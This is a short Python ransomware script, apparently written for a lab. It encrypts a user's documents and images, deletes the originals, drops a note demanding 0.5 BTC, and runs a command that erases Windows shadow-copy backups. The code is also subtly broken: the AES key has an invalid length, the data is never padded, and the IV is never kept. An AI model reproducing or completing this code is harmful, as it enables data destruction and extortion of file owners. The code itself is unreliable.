import os
from Crypto.Cipher import AES
KEY = b"labkeymaterial0123456789abcdef"
for root, dirs, files in os.walk("C:\\Users\\lab\\Documents"):
    for name in files:
        if name.endswith((".docx", ".xlsx", ".pdf", ".jpg")):
            p = os.path.join(root, name)
            data = open(p, "rb").read()
            open(p + ".locked", "wb").write(AES.new(KEY, AES.MODE_CBC).encrypt(data))
            os.remove(p)
open("README_RESTORE.txt", "w").write("Your files are encrypted. Pay 0.5 BTC to recover them. Contact restore@evil.invalid")
os.system("vssadmin Delete Shadows /all /quiet")
